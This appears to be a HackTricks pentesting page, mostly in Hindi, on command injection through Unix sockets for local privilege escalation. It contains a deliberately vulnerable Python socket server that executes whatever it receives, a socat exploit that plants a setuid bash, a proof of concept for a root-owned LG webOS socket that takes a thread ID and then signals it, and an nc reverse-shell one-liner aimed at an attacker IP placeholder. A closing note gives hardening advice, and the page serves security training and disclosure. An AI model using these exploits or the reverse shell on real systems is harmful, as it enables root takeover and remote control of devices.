# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Python के साथ Socket binding का उदाहरण

निम्नलिखित उदाहरण में एक **unix socket बनाया जाता है** (`/tmp/socket_test.s`) और **प्राप्त होने वाली हर चीज़** को `os.system` द्वारा **execute किया जाता है**। मुझे पता है कि आपको ऐसा वास्तविक दुनिया में नहीं मिलेगा, लेकिन इस उदाहरण का उद्देश्य यह देखना है कि unix sockets का उपयोग करने वाला code कैसा दिखता है और सबसे खराब स्थिति में input को कैसे manage किया जाए।
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**कोड चलाएं** using python: `python s.py` और **जांचें कि socket किस प्रकार listening कर रहा है**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## केस स्टडी: Root-owned UNIX socket signal-triggered escalation (LG webOS)

कुछ privileged daemons एक ऐसा root-owned UNIX socket expose करते हैं जो untrusted input स्वीकार करता है और privileged actions को thread-IDs तथा signals से जोड़ता है। यदि protocol किसी unprivileged client को यह प्रभावित करने देता है कि किस native thread को target किया जाए, तो आप privileged code path trigger करके escalation कर सकते हैं।

देखा गया pattern:
- किसी root-owned socket (जैसे /tmp/remotelogger) से connect करें।
- एक thread बनाएँ और उसका native thread id (TID) प्राप्त करें।
- TID (packed) और padding को request के रूप में भेजें; acknowledgement प्राप्त करें।
- privileged behaviour trigger करने के लिए उस TID को एक specific signal भेजें।

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
इसे root shell में बदलने के लिए, एक सरल named-pipe + nc pattern का उपयोग किया जा सकता है:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notes:
- इस प्रकार के bugs unprivileged client state (TIDs) पर भरोसा करने और उन्हें privileged signal handlers या logic से bind करने के कारण उत्पन्न होते हैं।
- Harden करने के लिए socket पर credentials लागू करें, message formats को validate करें, और privileged operations को externally supplied thread identifiers से decouple करें।

## संदर्भ

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
